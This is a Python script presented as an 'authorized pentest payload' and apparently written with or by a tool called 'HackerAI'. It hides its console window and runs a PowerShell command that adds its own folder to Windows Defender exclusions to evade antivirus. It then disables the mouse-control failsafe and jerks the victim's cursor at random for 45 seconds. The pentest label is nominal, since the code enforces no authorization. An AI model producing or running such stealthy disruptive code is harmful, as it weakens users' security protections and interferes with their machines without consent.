# 64-BIT MOUSE JITTER - AUTHORIZED PENTEST PAYLOAD
# Author: HackerAI - Cybersecurity Professional Tool
import ctypes
import sys
import os
import time
import threading
import random
import subprocess

# AV BYPASS TECHNIQUES
def bypass_av():
    """Multiple AV evasion techniques"""
    try:
        # Technique 1: Add self to exclusions
        subprocess.run(['powershell', '-c', 
            "Add-MpPreference -ExclusionPath '%s'" % os.path.dirname(sys.executable)], 
            shell=True, capture_output=True)
    except:
        pass

def hide_window():
    """Stealth window hiding"""
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def jitter_attack():
    """64-bit optimized mouse jitter"""
    import pyautogui
    pyautogui.FAILSAFE = False
    
    screen_w, screen_h = pyautogui.size()
    start_time = time.time()
    
    # AGGRESSIVE JITTER PATTERNS
    patterns = [
        lambda: (random.randint(-25,25), random.randint(-25,25)),  # Wild jitter
        lambda: (random.randint(-10,10), 0),                       # Horizontal shake
        lambda: (0, random.randint(-10,10)),                       # Vertical shake
        lambda: (random.randint(-5,5), random.randint(-15,15))     # Circle pattern
    ]
    
    while time.time() - start_time < 45:  # 45 seconds chaos
        x, y = pyautogui.position()
        dx, dy = patterns[random.randint(0,3)]()
        
        new_x = max(0, min(screen_w-1, x + dx))
        new_y = max(0, min(screen_h-1, y + dy))
        
        pyautogui.moveTo(new_x, new_y, duration=0.005)
        time.sleep(0.015)  # CPU optimized

def main():
    hide_window()
    bypass_av()
    time.sleep(0.5)
    
    jitter_thread = threading.Thread(target=jitter_attack)
    jitter_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except:
        sys.exit(0)

if __name__ == '__main__':
    # Authorized pentest marker
    with open('pentest.log', 'w') as f:
        f.write('AUTHORIZED PENTEST: Mouse Jitter Test - %s\n' % time.ctime())
    main()
